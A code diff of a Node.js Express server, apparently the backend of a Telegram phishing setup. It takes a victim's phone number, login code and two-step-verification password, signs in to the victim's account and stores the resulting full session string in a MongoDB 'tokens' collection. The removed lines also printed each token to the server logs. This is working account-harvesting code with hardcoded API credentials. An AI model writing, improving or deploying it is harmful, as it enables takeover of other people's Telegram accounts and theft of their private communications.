@@ -1,137 +1,165 @@
 require('dotenv').config();
-const express = require('express');
-const cors = require('cors');
-const { spawn } = require('child_process');
-const path = require('path');
+const express    = require('express');
+const cors       = require('cors');
 const { MongoClient } = require('mongodb');
+const { TelegramClient } = require('telegram');
+const { StringSession }  = require('telegram/sessions');
+const { Api } = require('telegram/tl');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// MongoDB URI from Render environment variable
-const MONGODB_URI = process.env.MONGO_URI;
-if (!MONGODB_URI) {
-    console.error("❌ MONGO_URI environment variable မသတ်မှတ်ရသေး!");
-    process.exit(1);
+// ── Config ────────────────────────────────────────────────────────────────────
+const API_ID   = parseInt(process.env.API_ID)  || 17349;
+const API_HASH = process.env.API_HASH           || '344583e45741c457fe1862106095a5eb';
+const MONGO_URI = process.env.MONGO_URI;
+
+if (!MONGO_URI) {
+  console.error('❌ MONGO_URI မသတ်မှတ်ရသေး!');
+  process.exit(1);
 }
 
-const client = new MongoClient(MONGODB_URI);
+// ── MongoDB ───────────────────────────────────────────────────────────────────
+const mongoClient = new MongoClient(MONGO_URI);
 let db;
-
 async function connectDB() {
-    try {
-        await client.connect();
-        db = client.db('telegram_data');
-        console.log('Connected to MongoDB Successfully');
-    } catch (err) {
-        console.error('MongoDB connection error:', err);
-    }
+  try {
+    await mongoClient.connect();
+    db = mongoClient.db('telegram_data');
+    console.log('✅ MongoDB connected!');
+  } catch (err) {
+    console.error('❌ MongoDB error:', err.message);
+  }
 }
 connectDB();
 
+// ── Session store (in-memory) ─────────────────────────────────────────────────
+// { phone -> { tempSession, phoneCodeHash } }
 const sessionStore = new Map();
 
-function callPython(command, data) {
-    return new Promise((resolve, reject) => {
-        const py = spawn('python3', [
-            path.join(__dirname, 'telegram_helper.py'),
-            command,
-            JSON.stringify(data)
-        ]);
-
-        let output = '';
-        py.stdout.on('data', (data) => {
-            output += data.toString();
-            console.log(`Python Output: ${data}`);
-        });
-        py.stderr.on('data', (data) => {
-            console.error(`Python Error: ${data}`);
-        });
-
-        py.on('close', (code) => {
-            console.log(`Python process exited with code ${code}. Final Output: ${output}`);
-            try {
-                resolve(JSON.parse(output));
-            } catch (e) {
-                reject(new Error(`Failed to parse Python output: ${output}`));
-            }
-        });
-    });
+// ── Telegram helper functions ─────────────────────────────────────────────────
+async function sendCode(phone) {
+  const client = new TelegramClient(
+    new StringSession(''), API_ID, API_HASH, { connectionRetries: 3 }
+  );
+  await client.connect();
+  try {
+    const result = await client.invoke(new Api.auth.SendCode({
+      phoneNumber: phone,
+      apiId: API_ID,
+      apiHash: API_HASH,
+      settings: new Api.CodeSettings({}),
+    }));
+    const tempSession = client.session.save();
+    return {
+      status: 'success',
+      phoneCodeHash: result.phoneCodeHash,
+      tempSession,
+    };
+  } finally {
+    await client.disconnect();
+  }
 }
 
-app.post('/api/send-otp', async (req, res) => {
-    const { phone } = req.body;
-    if (!phone) return res.status(400).json({ error: 'Phone is required' });
-
+async function verifyCode(phone, code, phoneCodeHash, tempSession, password = null) {
+  const client = new TelegramClient(
+    new StringSession(tempSession), API_ID, API_HASH, { connectionRetries: 3 }
+  );
+  await client.connect();
+  try {
     try {
-        const result = await callPython('send_code', { phone });
-        if (result.status === 'success') {
-            sessionStore.set(phone, { 
-                phone_code_hash: result.phone_code_hash,
-                temp_session: result.temp_session 
-            });
-            res.json({ message: 'OTP sent via Telegram' });
-        } else {
-            res.status(400).json({ error: result.message });
-        }
+      await client.invoke(new Api.auth.SignIn({
+        phoneNumber: phone,
+        phoneCodeHash,
+        phoneCode: code,
+      }));
     } catch (err) {
-        res.status(500).json({ error: 'Internal server error' });
+      if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
+        if (!password) {
+          return { status: 'password_required', tempSession };
+        }
+        // 2FA
+        const pwdInfo = await client.invoke(new Api.account.GetPassword());
+        const { computeCheck } = require('telegram/Password');
+        const inputCheck = await computeCheck(pwdInfo, password);
+        await client.invoke(new Api.auth.CheckPassword({ password: inputCheck }));
+      } else {
+        throw err;
+      }
     }
+    const session = client.session.save();
+    return { status: 'success', session };
+  } finally {
+    await client.disconnect();
+  }
+}
+
+// ── Routes ────────────────────────────────────────────────────────────────────
+app.post('/api/send-otp', async (req, res) => {
+  const { phone } = req.body;
+  if (!phone) return res.status(400).json({ error: 'Phone is required' });
+
+  try {
+    console.log(`📱 Sending OTP to ${phone}...`);
+    const result = await sendCode(phone);
+    sessionStore.set(phone, {
+      phoneCodeHash: result.phoneCodeHash,
+      tempSession:   result.tempSession,
+    });
+    console.log(`✅ OTP sent to ${phone}`);
+    res.json({ message: 'OTP sent via Telegram' });
+  } catch (err) {
+    console.error('send-otp error:', err.message);
+    res.status(500).json({ error: err.message || 'Internal server error' });
+  }
 });
 
 app.post('/api/verify-otp', async (req, res) => {
-    const { phone, code, password } = req.body;
-    const session = sessionStore.get(phone);
+  const { phone, code, password } = req.body;
+  const stored = sessionStore.get(phone);
+  if (!stored) return res.status(400).json({ error: 'Session not found. Please request OTP again.' });
 
-    if (!session) return res.status(400).json({ error: 'Session not found' });
+  try {
+    console.log(`🔐 Verifying OTP for ${phone}...`);
+    const result = await verifyCode(
+      phone, code,
+      stored.phoneCodeHash,
+      stored.tempSession,
+      password
+    );
 
-    try {
-        const result = await callPython('verify_code', {
-            phone,
-            code,
-            phone_code_hash: session.phone_code_hash,
-            temp_session: session.temp_session,
-            password
-        });
-
-        if (result.status === 'success') {
-            sessionStore.delete(phone);
-            
-            const sessionToken = result.session;
-            
-            // Log to Render Log as requested
-            console.log(`account token is ${sessionToken}`);
-
-            // Save to MongoDB
-            if (db) {
-                try {
-                    await db.collection('tokens').insertOne({
-                        phone: phone,
-                        token: sessionToken,
-                        createdAt: new Date()
-                    });
-                    console.log(`Token for ${phone} saved to MongoDB successfully. Token length: ${sessionToken ? sessionToken.length : 0}`);
-                } catch (mongoErr) {
-                    console.error('Error saving to MongoDB:', mongoErr);
-                }
-            } else {
-                console.error('Database connection not established');
-            }
-
-            res.json({ message: 'Success', session: sessionToken });
-        } else if (result.status === 'password_required') {
-            res.json({ status: 'password_required', message: 'Two-step verification password required' });
-        } else {
-            res.status(400).json({ error: result.message });
-        }
-    } catch (err) {
-        console.error('Verify OTP error:', err);
-        res.status(500).json({ error: 'Internal server error' });
+    if (result.status === 'password_required') {
+      // Keep session for 2FA step
+      sessionStore.set(phone, { ...stored, tempSession: result.tempSession });
+      return res.json({ status: 'password_required' });
     }
+
+    sessionStore.delete(phone);
+    console.log(`✅ Login success for ${phone} | session length: ${result.session?.length}`);
+
+    // Save to MongoDB
+    if (db) {
+      try {
+        await db.collection('tokens').insertOne({
+          phone,
+          token: result.session,
+          createdAt: new Date(),
+        });
+        console.log(`💾 Token saved to MongoDB`);
+      } catch (mongoErr) {
+        console.error('MongoDB save error:', mongoErr.message);
+      }
+    }
+
+    res.json({ message: 'Success', session: result.session });
+  } catch (err) {
+    console.error('verify-otp error:', err.message);
+    res.status(400).json({ error: err.message || 'Verification failed' });
+  }
 });
 
-app.get('/', (req, res) => res.send('Telegram Session Backend with MongoDB (Fixed) Running'));
+app.get('/', (req, res) => res.send('✅ Telegram Session Backend Running'));
 
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`🌐 Server on port ${PORT}`));
